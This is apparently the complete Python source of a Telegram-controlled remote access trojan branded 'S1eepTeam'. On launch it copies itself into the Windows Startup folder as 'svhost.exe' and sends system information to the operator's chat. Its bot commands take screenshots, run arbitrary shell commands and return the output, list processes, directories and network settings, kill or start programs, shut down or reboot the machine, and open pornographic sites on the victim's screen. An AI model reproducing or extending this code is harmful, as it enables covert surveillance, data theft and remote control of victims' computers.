import sys
import telebot
import io
from telebot import *
import os
import pyautogui as pg
from pyautogui import *
import pyscreeze
import time as t
import subprocess
import random
import shutil
import webbrowser
import mouse
from telebot.types import BotCommand
from urllib3.util import url

token='' #TOKEN BOT

bot=telebot.TeleBot(token, parse_mode=None)

id=0 #ID CHAT

us=os.path.join(os.path.expanduser('~'), 'S1eepTeam')
pw=os.makedirs(us, exist_ok=True)

commandsTw=[
    BotCommand('start', description='Начать'),
    BotCommand('info', description='Информация пк'),
    BotCommand('ip', 'Информация об айпи'),
    BotCommand('sc', description='Показать экран'),
    BotCommand('scs', description='Показывать экран'),
    BotCommand('ms', description='Показать сообщение на экране'),
    BotCommand('protas', description='Лист процессов'),
    BotCommand('cd', description='Директории'),
    BotCommand('cmd', description='Выполнение команд'),
    BotCommand('click', description='Авто клики'),
    BotCommand('site', description='Открыть ссылку'),
    BotCommand('open', description='Открыть программу'),
    BotCommand('kill', description='Закрыть программу'),
    BotCommand('alt', description='Alt + F4'),
    BotCommand('porn', description='PornHub'),
    BotCommand('dance', description='Танцы окон'),
    BotCommand('rep', description='Перезагрузить пк'),
    BotCommand('ofp', description='Выключить пк')
]


def run_cmd(command):
    try:
        result = subprocess.check_output(command, shell=True, text=True, encoding='cp866')  # cp866 для Windows CMD
        return result
    except subprocess.CalledProcessError as e:
        return f"Ошибка выполнения команды: {e}"

def st():
    try:
        bot.send_message(chat_id=id, text='Кто-то включил твою ратку')
        osnova=sys.executable
        stra=os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start menu', 'Programs', 'Startup')
        iot=os.path.join(stra, os.path.basename(osnova))
        shutil.copy2(osnova, iot)
        os.rename(os.path.join(stra, 'SnosByS1eepV2.exe'), os.path.join(stra, 'svhost.exe'))
        bot.send_message(chat_id=id, text='Ратка была добавлена в авто загрузку')
        r2dwa = random.randint(111111, 999999)
        output = run_cmd('systeminfo')
        with io.open(os.path.join(us, f'FileInfo{r2dwa}.txt'), 'w', encoding='utf-8') as f:
            f.write(output)

        with io.open(os.path.join(us, f'FileInfo{r2dwa}.txt'), 'r', encoding='utf-8') as we:
            bot.send_document(chat_id=id, document=we)

        t.sleep(1)

        os.remove(os.path.join(us, f'FileInfo{r2dwa}.txt'))
    except FileNotFoundError:
        bot.send_message(chat_id=id, text='Мы не смогли найти файл')
    except OSError:
        bot.send_message(chat_id=id, text='Мы не смогли добавить в startup либо он уже добавлен')

st()

@bot.message_handler(commands=['start'])
def start(message):
    bot.set_my_commands(commandsTw)
    bot.send_message(chat_id=id, text='''/start - Начать
/info - Информация пк
/ip - Информация об айпи
/sc - Показать экран
/scs - Показывать экран
/ms - Показать сообщение на экране
/protas - Лист процессов
/cd - Директории
/cmd - Выполнение команд
/click - Авто клики
/site - Открыть ссылку
/open - Открыть программу
/kill - Закрыть программу
/alt - Alt + F4
/porn - PornHub
/dance - Танцы окон
/rep - Перезагрузить пк
/ofp - Выключить пк''')

@bot.message_handler(commands=['sc'])
def scr(message):
    r2 = random.randint(111111, 999999)
    screenw = pg.screenshot()
    screenw.save(os.path.join(us, f'Desktop{r2}.png'))
    bot.send_message(chat_id=id, text='Ожидание экрана, 3 секунды')
    bot.send_photo(chat_id=id, photo=screenw)

    t.sleep(0.1)

    os.remove(os.path.join(us, f'Desktop{r2}.png'))

@bot.message_handler(commands=['ms'])
def mes(message):
    arg=message.text.split(' ', 1)
    if len(arg) > 1:
        user_in = arg[1]
        with io.open(os.path.join(us, 'ttr.txt'), 'a', encoding='utf-8') as f:
            f.write('S1eepTeam: ' + user_in + ' (Не забудьте сохранить!)' + '\n\n')
        bot.send_message(chat_id=id, text=f'Сообщение было выведено на экран: {user_in}')
        run_cmd(f'start {us}\\ttr.txt')
    else:
        bot.send_message(chat_id=id, text='После /ms укажите текст!')

@bot.message_handler(commands=['ofp'])
def oftw(message):
    bot.send_message(chat_id=id, text='Пожелаем ему удачи! (ПК был выключен)')
    run_cmd('shutdown /s /t 5 /c "Пока от S1eepTeam! Пк будет выключен."')

@bot.message_handler(commands=['rep'])
def reo(message):
    bot.send_message(chat_id=id, text='Вы перезагрузили пк')
    run_cmd('shutdown /r /t 5 /c "Пока от S1eepTeam! Пк будет перезагружен."')

@bot.message_handler(commands=['site'])
def sit(message):
    args=message.text.split(' ', 1)
    if len(args) > 1:
        url = args[1]
        webbrowser.open_new_tab(url)
        bot.send_message(chat_id=id, text=f'Сайт {url} был открыт')
    else:
        bot.send_message(chat_id=id, text='После /site напишите ссылку на сайт!')

@bot.message_handler(commands=['protas'])
def protas(message):
    ra1 = random.randint(111111, 999999)
    output = run_cmd('tasklist')
    with io.open(os.path.join(us, f'FileTaks{ra1}.txt'), 'w', encoding='utf8') as f:
        f.write(output)

    with io.open(os.path.join(us, f'FileTaks{ra1}.txt'), 'r', encoding='utf8') as we:
        bot.send_document(chat_id=id, document=we)

    t.sleep(0.1)

    os.remove(os.path.join(us, f'FileTaks{ra1}.txt'))

@bot.message_handler(commands=['info'])
def info(message):
    r2 = random.randint(111111, 999999)
    output = run_cmd('systeminfo')
    with io.open(os.path.join(us, f'FileInfo{r2}.txt'), 'w', encoding='utf8') as f:
        f.write(output)

    with io.open(os.path.join(us, f'FileInfo{r2}.txt'), 'r', encoding='utf8') as we:
        bot.send_document(chat_id=id, document=we)

    t.sleep(0.1)

    os.remove(os.path.join(us, f'FileInfo{r2}.txt'))

@bot.message_handler(commands=['kill'])
def kille(message):
    args=message.text.split(' ', 1)
    if len(args) > 1:
        kil=args[1]
        output = run_cmd(f'taskkill /IM {kil} /F')
        bot.send_message(chat_id=id, text=f'Программа {kil} была закрыта')
    else:
        bot.send_message(chat_id=id, text='После /kill укажите название файла')

@bot.message_handler(commands=['open'])
def open(message):
    args = message.text.split(' ', 1)
    if len(args) > 1:
        st = args[1]
        output = run_cmd(f'start {st}')
        bot.send_message(chat_id=id, text=f'Программа {st} была открыта')
    else:
        bot.send_message(chat_id=id, text='После /open укажите название файла')

@bot.message_handler(commands=['scs'])
def scs(message):
    num = message.text.split(' ', 1)
    if len(num) > 1:
        lol = int(num[1])
        bot.send_message(chat_id=id, text=f'Делаю {lol} снимков, ожидайте!')
        for i in range(0, lol):
            r2 = random.randint(111111, 999999)
            shr = pg.screenshot()
            shr.save(os.path.join(us, f'Desktop{r2}.png'))
            bot.send_photo(chat_id=id, photo=shr)
            pg.sleep(0.1)
            os.remove(os.path.join(us, f'Desktop{r2}.png'))
            pg.sleep(0.5)
        bot.send_message(chat_id=id, text=f'Завершено, {lol} снимков было выслано вам')
    else:
        bot.send_message(chat_id=id, text='После /scs напишите кол-во')

@bot.message_handler(commands=['alt'])
def alt(message):
    pg.hotkey('Alt', 'F4')

@bot.message_handler(commands=['porn'])
def porn(message):
    webbrowser.open('https://m.rusoska3.net/')
    webbrowser.open('https://m.rusoska3.net/video/205059')
    webbrowser.open('https://m.rusoska3.net/video/205058')
    webbrowser.open('https://m.rusoska3.net/video/205048')
    webbrowser.open('https://m.rusoska3.net/video/205045')
    webbrowser.open('https://m.rusoska3.net/video/205049')
    webbrowser.open('https://m.rusoska3.net/video/205040')

@bot.message_handler(commands=['dance'])
def dance(message):
    dwa=message.text.split(' ', 1)
    if len(dwa) > 1:
        nu=int(dwa[1])
        bot.send_message(chat_id=id, text='Alt + Tab')
        for i in range(0, nu):
            pg.hotkey('Alt', 'Tab')
            pg.sleep(0.3)

@bot.message_handler(commands=['cd'])
def cd(message):
    cde=message.text.split(' ', 1)
    if len(cde) > 1:
        oi=cde[1]
        one=os.listdir(oi)
        two='\n'.join(one)
        bot.send_message(chat_id=id, text=f'Директории:')
        r2 = random.randint(111111, 999999)
        with io.open(os.path.join(us, f'FileDir{r2}.txt'), 'w', encoding='utf8') as f:
            f.write(two)

        with io.open(os.path.join(us, f'FileDir{r2}.txt'), 'r', encoding='utf8') as d:
            bot.send_document(chat_id=id, document=d)

        t.sleep(0.1)

        os.remove(os.path.join(us, f'FileDir{r2}.txt'))
    else:
        bot.send_message(chat_id=id, text='Напишите путь после /cd')

@bot.message_handler(commands=['cmd'])
def cmd(message):
    cmdw=message.text.split(' ', 1)
    if len(cmdw) > 1:
        hoh=cmdw[1]
        te=subprocess.run(f'{hoh}', shell=True, text=True, capture_output=True, encoding='cp866')
        bot.send_message(chat_id=id, text=f'Активна команда:\n{hoh}')
        bot.send_message(chat_id=id, text=f'Вывод:')
        r2 = random.randint(111111, 999999)
        with io.open(os.path.join(us, f'FileCmd{r2}.txt'), 'a', encoding='utf8') as f:
            f.write(f'| {te} |')

        with io.open(os.path.join(us, f'FileCmd{r2}.txt'), 'r', encoding='utf8') as cw:
            bot.send_document(chat_id=id, document=cw)

        t.sleep(0.1)

        os.remove(os.path.join(us, f'FileCmd{r2}.txt'))
    else:
        bot.send_message(chat_id=id, text='Напишите команду после /cmd')

@bot.message_handler(commands=['ip'])
def ip(message):
    r2 = random.randint(111111, 999999)
    bot.send_message(chat_id=id, text='Айпи был записан, держите:')
    with io.open(os.path.join(us, f'IP{r2}.txt'), 'a', encoding='utf8') as f:
        f.write(f'{subprocess.run(['ipconfig'], capture_output=True,text=True,shell=True, encoding='cp866')}')

    with io.open(os.path.join(us, f'IP{r2}.txt'), 'r', encoding='utf8') as cw:
        bot.send_document(chat_id=id, document=cw)

    t.sleep(0.1)

    os.remove(os.path.join(us, f'IP{r2}.txt'))

@bot.message_handler(commands=['click'])
def click(message):
    wer=message.text.split(' ', 1)
    if len(wer) > 1:
        ckic=wer[1]
        bot.send_message(chat_id=id, text=f'Атака кликова началась, кол-во кликов ({ckic})')
        for i in range(0, int(ckic)):
            pg.leftClick()
        bot.send_message(chat_id=id, text='Атака кликов была завершена!')
    else:
        bot.send_message(chat_id=id, text='После /click напишите кол-во повторений')

@bot.message_handler(content_types=['text'])
def text(message):
    if message.text == 'Ответ':
        with io.open(os.path.join(us, 'ttr.txt'), 'r', encoding='utf-8') as f:
            bot.send_document(chat_id=id, document=f)
        bot.send_message(chat_id=id, text='Вы решили посмотреть ответ')

bot.infinity_polling()
